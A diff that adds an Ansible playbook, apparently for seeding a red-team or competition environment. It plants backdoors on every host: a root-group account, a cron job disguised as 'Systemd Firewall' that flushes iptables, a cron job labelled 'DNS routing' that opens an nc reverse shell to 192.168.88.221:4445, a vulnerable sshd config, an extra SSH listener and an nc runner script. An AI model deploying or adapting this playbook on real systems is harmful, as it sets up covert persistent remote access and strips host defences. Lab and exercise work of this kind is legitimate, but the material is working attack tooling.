@@ -1,0 +1,79 @@
+---
+- hosts: all
+  tasks:
+    - name: Install Apache/MySQL
+      yum:
+        name:
+          - httpd
+          - nc
+          - vim
+          - screen
+          - tree
+
+    - name: Create additional users
+      user:
+        name: ftp_deamon
+        shell: /bin/bash
+        groups: root
+        # Need password set here
+
+#    - name: Create "normal" user
+#      user:
+#        name: jalger
+#        comment: "John F. Alger"
+#        shell: /bin/zsh
+#        groups: users
+
+#    - name: Create second normal user
+#      user:
+#        name: linda
+#        comment: "Linda R. Carrier"
+#        shell: /bin/bash
+#        groups: users
+
+#    - name: Create hackerman user
+#      user:
+#        name: hackerman
+#        shell: /bin/bash
+#        groups: root,sudo
+
+    - name: Root crontab iptables flush
+      cron:
+        name: "Systemd Firewall - DO NOT REMOVE"
+        minute: "*/5"
+        job: "iptables -F"
+
+    - name: /etc/cron.d entry
+      cron:
+        name: "Default system"
+        cron_file: system
+        minute: "*/5"
+        user: root
+        job: "chattr +i /etc/passwd"
+
+    - name: Netcat crontab
+      cron:
+        name: "DNS routing"
+        minute: "*"
+        job: "nc 192.168.88.221 4445 -e /bin/bash"
+
+    - name: Copy vulnerable sshd_config
+      copy: 
+        src: sshd_config
+        dest: /etc/ssh/sshd_config
+
+    - name: Start second SSH listener
+      shell: /usr/sbin/sshd -p 2223
+
+    - name: call infinite nc runner
+      shell: ./ncRevScript &
+
+#    - name: Copy os-release
+#      copy:
+#        src: os-release
+#        dest: /etc/os-release
+
+#    - name: Copy issue
+#      copy:
+#        src: issue
+#        dest: /etc/issue
